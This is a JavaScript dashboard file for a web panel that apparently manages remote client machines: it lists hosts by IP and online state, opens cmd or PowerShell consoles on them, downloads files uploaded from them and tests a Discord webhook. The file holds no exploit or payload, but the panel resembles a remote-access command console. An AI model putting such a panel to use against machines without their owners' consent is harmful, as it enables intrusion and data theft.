// language: JavaScript, file: public/js/dashboard.js
const $ = (id) => document.getElementById(id);

let me = null;

const HOST_PAGE_SIZE = 50;
const REMOTE_PAGE_SIZE = 50;

const state = {
  hosts:  { offset: 0, q: '', status: 'all', total: 0 },
  remote: { offset: 0, q: '' },
};

let pollTimer = null;

async function loadMe() {
  const r = await fetch('/api/me');
  if (r.status === 401) { location.href = '/signin.html'; return; }
  me = await r.json();
  $('who').textContent = me.username;
  $('ov-akey').textContent = me.accountKey;
  $('ov-since').textContent = new Date(me.createdAt).toLocaleDateString();
  $('ov-wh').textContent = me.discordWebhook ? 'connected' : '—';
  $('whurl').value = me.discordWebhook || '';
  $('a-user').textContent = me.username;
  $('a-mail').textContent = me.email;
  revealSetup('a-akey', me.accountKey);
  revealSetup('a-ltok', me.loginToken);
}

function revealSetup(id, value) {
  const el = $(id);
  el.dataset.real = value;
  el.dataset.shown = '0';
  el.textContent = '•'.repeat(value.length);
}

document.addEventListener('click', (e) => {
  const b = e.target.closest('[data-reveal]');
  if (!b) return;
  const el = $(b.dataset.reveal);
  const shown = el.dataset.shown === '1';
  if (shown) {
    el.textContent = '•'.repeat(el.dataset.real.length);
    el.dataset.shown = '0';
    b.textContent = 'reveal';
  } else {
    el.textContent = el.dataset.real;
    el.dataset.shown = '1';
    b.textContent = 'hide';
  }
});

document.querySelectorAll('.nav a').forEach((a) => {
  a.addEventListener('click', () => {
    document.querySelectorAll('.nav a').forEach((x) => x.classList.remove('active'));
    document.querySelectorAll('.section').forEach((x) => x.classList.remove('active'));
    a.classList.add('active');
    $(a.dataset.tab).classList.add('active');
    const tab = a.dataset.tab;
    if (tab === 'overview') { loadOverview(); startPolling(); }
    else if (tab === 'hosts') { loadHosts(); startPolling(); }
    else if (tab === 'remote') { loadRemote(); startPolling(); }
    else stopPolling();
  });
});

function stopPolling() { if (pollTimer) { clearInterval(pollTimer); pollTimer = null; } }
function startPolling() {
  stopPolling();
  pollTimer = setInterval(() => {
    const active = document.querySelector('.nav a.active')?.dataset.tab;
    if (active === 'overview') loadOverview();
    else if (active === 'hosts') loadHosts();
    else if (active === 'remote') loadRemote();
  }, 3000);
}

async function loadOverview() {
  const r = await fetch('/api/clients?limit=1&offset=0');
  if (!r.ok) return;
  const d = await r.json();
  $('ov-online').textContent = d.online;
  $('ov-offline').textContent = d.offline;
  $('ov-total').textContent = d.total;
}

function fmtAgo(ts) {
  const s = Math.floor((Date.now() - ts) / 1000);
  if (s < 60) return `${s}s ago`;
  if (s < 3600) return `${Math.floor(s / 60)}m ago`;
  if (s < 86400) return `${Math.floor(s / 3600)}h ago`;
  return `${Math.floor(s / 86400)}d ago`;
}

function esc(s) {
  return String(s == null ? '' : s).replace(/[&<>"']/g, (c) => ({
    '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;',
  }[c]));
}

// ---------- HOSTS ----------
async function loadHosts() {
  const s = state.hosts;
  const q = new URLSearchParams({
    status: s.status, q: s.q, limit: String(HOST_PAGE_SIZE), offset: String(s.offset),
  });
  const r = await fetch('/api/clients?' + q);
  if (!r.ok) return;
  const d = await r.json();
  s.total = d.total;
  $('h-count').textContent = `${d.total} total · ${d.online} online · ${d.offline} offline`;

  const host = $('h-rows');
  host.innerHTML = '';
  if (d.rows.length === 0) {
    host.innerHTML = '<div class="empty">no hosts</div>';
  } else {
    d.rows.forEach(c => host.appendChild(buildRow(c, () => openHostDetail(c))));
  }

  const page = Math.floor(s.offset / HOST_PAGE_SIZE) + 1;
  const pages = Math.max(1, Math.ceil(d.total / HOST_PAGE_SIZE));
  $('h-page').textContent = `page ${page} / ${pages}`;
  $('h-prev').disabled = s.offset === 0;
  $('h-next').disabled = s.offset + HOST_PAGE_SIZE >= d.total;
}

function buildRow(c, onOpen) {
  const el = document.createElement('div');
  el.className = 'row';
  el.innerHTML = `
    <span class="dot ${c.online ? 'on' : 'off'}"></span>
    <span class="host">${esc(c.hostname)}</span>
    <span class="ip">${esc(c.ip)}</span>
    <span class="seen">${fmtAgo(c.lastSeen)}</span>
    <span class="actions">
      <button class="ghost mini" data-open>open</button>
    </span>`;
  el.addEventListener('click', (e) => {
    if (e.target.closest('[data-open]') || !e.target.closest('button')) onOpen();
  });
  return el;
}

async function openHostDetail(c) {
  const box = $('h-detail');
  box.innerHTML = '';

  const el = document.createElement('div');
  el.className = 'detail';
  el.innerHTML = `
    <h3>${esc(c.hostname)}</h3>
    <div class="sub" style="margin:0;color:var(--green-2)">${esc(c.ip)}</div>

    <div class="kv">
      <div class="k">client id</div><div class="v">${c.id}</div>
      <div class="k">state</div>   <div class="v plain" style="color:${c.online ? 'var(--green-2)' : 'var(--muted)'}">${c.online ? 'online' : 'offline'}</div>
      <div class="k">ipv4</div>    <div class="v">${esc(c.ip)}</div>
      <div class="k">last seen</div><div class="v plain">${new Date(c.lastSeen).toLocaleString()}</div>
    </div>

    <div style="display:flex;gap:8px;margin-top:16px;flex-wrap:wrap">
      <button class="ghost mini" data-cmd>open cmd</button>
      <button class="ghost mini" data-ps>open powershell</button>
      <button class="ghost mini" data-del style="border-color:var(--red);color:var(--red)">delete</button>
      <button class="ghost mini" data-close>close</button>
    </div>

    <h3 style="margin-top:20px">uploads</h3>
    <div id="u-list"><div class="note">loading…</div></div>
  `;
  box.appendChild(el);

  el.querySelector('[data-cmd]').addEventListener('click', () => openConsole(c, 'cmd'));
  el.querySelector('[data-ps]').addEventListener('click',  () => openConsole(c, 'powershell'));
  el.querySelector('[data-close]').addEventListener('click', () => box.innerHTML = '');
  el.querySelector('[data-del]').addEventListener('click', async () => {
    if (!confirm(`delete ${c.hostname}?`)) return;
    const r = await fetch(`/api/clients/${c.id}`, { method: 'DELETE' });
    if (r.ok) { box.innerHTML = ''; loadHosts(); }
  });

  await loadUploads(c.id, el.querySelector('#u-list'));
}

async function loadUploads(clientId, container) {
  const r = await fetch(`/api/clients/${clientId}/uploads`);
  if (!r.ok) { container.innerHTML = '<div class="note">failed to load</div>'; return; }
  const rows = await r.json();
  container.innerHTML = '';
  if (rows.length === 0) {
    container.innerHTML = '<div class="note">no uploads yet.</div>';
    return;
  }
  rows.forEach(u => {
    const el = document.createElement('div');
    el.className = 'upload-row';
    el.innerHTML = `
      <div>
        <div class="name">${esc(u.filename)}</div>
        <div class="meta">${new Date(u.created_at).toLocaleString()} · ${humanSize(u.size)}</div>
      </div>
      <button class="ghost mini" data-dl>download</button>`;
    el.querySelector('[data-dl]').addEventListener('click', () => {
      location.href = `/api/uploads/${u.id}/download`;
    });
    container.appendChild(el);
  });
}

function humanSize(n) {
  if (n < 1024) return `${n} B`;
  if (n < 1024 * 1024) return `${(n / 1024).toFixed(1)} KB`;
  return `${(n / 1024 / 1024).toFixed(2)} MB`;
}

// ---------- REMOTE ----------
async function loadRemote() {
  const s = state.remote;
  const q = new URLSearchParams({
    status: 'online', q: s.q, limit: String(REMOTE_PAGE_SIZE), offset: String(s.offset),
  });
  const r = await fetch('/api/clients?' + q);
  if (!r.ok) return;
  const d = await r.json();
  $('r-count').textContent = `${d.online} online`;

  const host = $('r-rows');
  host.innerHTML = '';
  if (d.rows.length === 0) {
    host.innerHTML = '<div class="empty">no online clients</div>';
  } else {
    d.rows.forEach(c => host.appendChild(buildRow(c, () => openConsole(c, null))));
  }

  const page = Math.floor(s.offset / REMOTE_PAGE_SIZE) + 1;
  const pages = Math.max(1, Math.ceil(d.online / REMOTE_PAGE_SIZE));
  $('r-page').textContent = `page ${page} / ${pages}`;
  $('r-prev').disabled = s.offset === 0;
  $('r-next').disabled = s.offset + REMOTE_PAGE_SIZE >= d.online;
}

// ---------- console ----------
function openConsole(c, shell) {
  const q = new URLSearchParams({
    id: String(c.id),
    host: c.hostname || '',
    ip: c.ip || '',
  });
  if (shell) q.set('shell', shell);
  window.open('/cmd.html?' + q.toString(), '_blank', 'width=900,height=580');
}

// ---------- toolbar wiring ----------
function debounce(fn, ms) { let t; return (...a) => { clearTimeout(t); t = setTimeout(() => fn(...a), ms); }; }

$('h-search').addEventListener('input', debounce((e) => { state.hosts.q = e.target.value; state.hosts.offset = 0; loadHosts(); }, 220));
$('h-status').addEventListener('change', (e) => { state.hosts.status = e.target.value; state.hosts.offset = 0; loadHosts(); });
$('h-refresh').addEventListener('click', () => { state.hosts.offset = 0; loadHosts(); });
$('h-prev').addEventListener('click', () => { state.hosts.offset = Math.max(0, state.hosts.offset - HOST_PAGE_SIZE); loadHosts(); });
$('h-next').addEventListener('click', () => { state.hosts.offset += HOST_PAGE_SIZE; loadHosts(); });

$('r-search').addEventListener('input', debounce((e) => { state.remote.q = e.target.value; state.remote.offset = 0; loadRemote(); }, 220));
$('r-refresh').addEventListener('click', () => { state.remote.offset = 0; loadRemote(); });
$('r-prev').addEventListener('click', () => { state.remote.offset = Math.max(0, state.remote.offset - REMOTE_PAGE_SIZE); loadRemote(); });
$('r-next').addEventListener('click', () => { state.remote.offset += REMOTE_PAGE_SIZE; loadRemote(); });

// ---------- settings ----------
$('whtest').addEventListener('click', async () => {
  $('wherr').textContent = '';
  const r = await fetch('/api/webhook/test', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ url: $('whurl').value.trim() }),
  });
  const d = await r.json().catch(() => ({}));
  $('wherr').textContent = r.ok ? 'webhook live' : (d.error || 'failed');
  if (r.ok) $('ov-wh').textContent = 'connected';
});

$('logout').addEventListener('click', async () => {
  await fetch('/api/logout', { method: 'POST' });
  location.href = '/signin.html';
});

loadMe();
loadOverview();
startPolling();